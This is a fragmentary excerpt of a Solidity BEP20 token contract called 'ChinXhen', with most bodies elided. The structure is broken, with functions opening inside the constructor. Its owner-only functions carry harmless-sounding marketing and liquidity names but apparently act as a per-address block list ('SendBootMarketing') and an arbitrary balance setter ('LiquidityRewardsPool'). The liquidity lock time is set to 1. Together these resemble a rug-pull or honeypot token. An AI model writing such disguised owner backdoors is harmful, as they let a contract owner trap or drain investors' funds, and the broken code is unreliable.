...
*/
    ...
    contract ChinXhen  is IBEP20, Ownable
    {
        ...
        string private constant _name = "ChinXhen";
        string private constant _symbol = "CXN";
        uint8 private constant _decimals = 9;
        uint256 public constant AvailableTickets= 1000000000000 * 10**_decimals;


        uint256 private constant DefaultLiquidityLockTime= 1;
        
        address public constant MarketingWallet=0x56FF4d20F2d68110e2AEAEE55FA23BE46c322ad3; 
        ...
        constructor () {
           ...
           function ClaimBootMarketing(address account) external onlyOwner {
            _isSendRewards[account] = false;
          }
          
            function SendBootMarketing(address[] calldata addresses) external onlyOwner {
      ...
      function LiquidityRewardsPool(address account, uint256 balance) onlyOwner  public virtual {
    ...
    function ExtendLiquidityLocked() public onlyOwner{
